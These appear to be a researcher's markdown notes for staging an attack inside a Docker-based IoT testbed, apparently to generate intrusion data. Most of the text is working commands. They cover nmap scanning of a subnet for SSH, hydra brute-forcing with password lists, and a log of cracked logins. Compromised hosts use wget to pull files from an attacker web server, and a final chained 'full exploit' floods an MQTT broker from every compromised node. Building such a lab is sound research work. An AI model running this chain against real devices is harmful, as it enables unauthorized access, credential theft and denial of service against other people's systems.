# hypothesis : 

customconnect has
- make gcc 
- libssh 
- libssh-devel
- openssh-clients
- unzip

already installed



# update custom connect

```bash
cd /home/mpoisson/Documents/NII/Manuel/mqtt-kafka/kafka-connect-bis/build
docker build -t customconnect .
```
# create/start/configure nodes
```bash
source /home/mpoisson/Documents/NII/Manuel/gotham-iot-testbed/venv_gotham/bin/activate
python /home/mpoisson/Documents/NII/Manuel/gotham-iot-testbed/src/create_topology_mqttset.py 
python /home/mpoisson/Documents/NII/Manuel/gotham-iot-testbed/src/run_scenario_test.py
```
## open ssh on some IoT devices
```bash
tmpfile="12345longNotExistingFile.txt"
for c in $(docker container ls | grep -E 'iotsim/domotic-monitor-bi' | awk '{print $1}');do echo -n "$c " >> $tmpfile;docker container exec $c hostname >> $tmpfile;done
cat $tmpfile
set -x
username="test"
pwd="password"
container_name="tor-bis-10"
cont=$(cat $tmpfile | grep $container_name | awk '{print $1}')
docker container exec $cont bash -c "useradd $username;echo $username:$pwd | chpasswd;service ssh restart"

username="admin"
pwd="1234"
container_name="tor-bis-5"
cont=$(cat $tmpfile | grep $container_name | awk '{print $1}')
docker container exec $cont bash -c "useradd $username;echo $username:$pwd | chpasswd;service ssh restart"

rm $tmpfile
```

# copy tools to connect
```bash
cont_id=$(docker container ls | grep client-conn | awk '{print $1}')
echo "id of container is $cont_id"

tool_copy="/home/mpoisson/Documents/NII/Manuel/tools/thc-hydra-master/"
dst="hydra"
docker cp  $tool_copy $cont_id:/tmp/$dst

tool_copy="/home/mpoisson/Documents/NII/Manuel/tools/nmap_standalone"
dst="nmap"
docker cp  $tool_copy $cont_id:/tmp/$dst

tool_copy="/home/mpoisson/Documents/NII/Manuel/tools/sshpass/sshpass.tar.gz"
dst="sshpass.tar.gz"
docker cp  $tool_copy $cont_id:/tmp/$dst

tool_copy="/home/mpoisson/Documents/NII/Manuel/tools/transfile.sh"
dst="transfile.sh"
docker cp  $tool_copy $cont_id:/tmp/$dst

tool_copy="/home/mpoisson/Documents/NII/Manuel/tools/mqttsa_bin"
dst="mqttsa"
docker cp  $tool_copy $cont_id:/tmp/$dst
```

# install hydra and sshpass
```bash
cont_id=$(docker container ls | grep customconnect | awk '{print $1}')
# install hydra
docker container exec -w /tmp/hydra $cont_id bash -c './configure --prefix=/tmp --debug --disable-xhydra'
docker container exec -w /tmp/hydra $cont_id bash -c 'make'
# install sshpass
docker container exec -w /tmp $cont_id bash -c 'tar -xzf sshpass.tar.gz;rm -f sshpass.tar.gz;cd sshpass-1.10/;./configure;make'
```

# get ips
```bash
./nmap -Pn 192.168.18.10-20 -p 22 -oG ips.txt
cat ips.txt | grep open | grep ssh | awk -F '[ :/]' '{print $3}' > ssh_ips.txt
```

# use hydra

## setup passwords and users list
[hydra usage](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
```bash
cont_id=$(docker container ls | grep customconnect | awk '{print $1}')
docker container exec -w /tmp $cont_id bash -c 'echo -e "test\nret\n1234\npasswd\nroot\ndodo\npassword" > p.txt'
docker container exec -w /tmp $cont_id bash -c 'echo -e "test\nadmin\nssh\nroot\nsshuser\nssh_user" > u.txt'
```

## launch bruteforce
```bash
cont_id=$(docker container ls | grep customconnect | awk '{print $1}')
docker container exec -w /tmp $cont_id bash -c 'hydra/hydra -L users.txt -P pass.txt -M ssh_ips.txt ssh -t 10 -o ssh_success.txt'
```
# transfert tool to IoT devices
```bash
python3 -m http.server&
ssh root@192.168.18.19 'wget -q 192.168.15.12:8000/ssh_ips.txt -O /tmp/important'
```

# run ssh command
```bash
cat ssh_success.txt 
# Hydra v9.6dev run at 2024-01-22 07:41:52 on ssh_ips.txt ssh (hydra/hydra -L users.txt -P pass.txt -M ssh_ips.txt -t 10 -o ssh_success.txt ssh)
# [22][ssh] host: 192.168.18.19   login: root   password: dodo
# [22][ssh] host: 192.168.18.18   login: sshuser   password: password
sshpass-1.10/sshpass -p "password" ssh -o StrictHostKeyChecking=no sshuser@192.168.18.18
```

# full exploit (assuming programs are present)

```bash
# get open ssh ports
/tmp/tools/nmap -Pn 192.168.18.10-20 -p 22 -oG ips.txt
cat ips.txt | grep open | grep ssh | awk -F '[ :/]' '{print $3}' > ssh_ips.txt
# bruteforce ssh passwords
hydra/hydra -L users.txt -P pass.txt -M ssh_ips.txt ssh -t 10 -o ssh_success.txt

# search open ssh ports
# ./nmap -Pn 192.168.18.10-20 -p 22 -oG ips.txt
# cat ips.txt | grep open | grep ssh | awk -F '[ :/]' '{print $3}' > ssh_ips.txt
./transfile.sh sop

# bruteforce ssh login/password (last arg is run TASKS number of connects in parallel per target)
./transfile.sh hyd 1
# transfert mqttsa to compromised nodes
./transfile.sh tfl success.txt mqttsa
# lauch mqttsa from all compromised nodes
./transfile.sh lcmd success.txt /tmp/mqttsa -fc 1000 192.168.2.1
```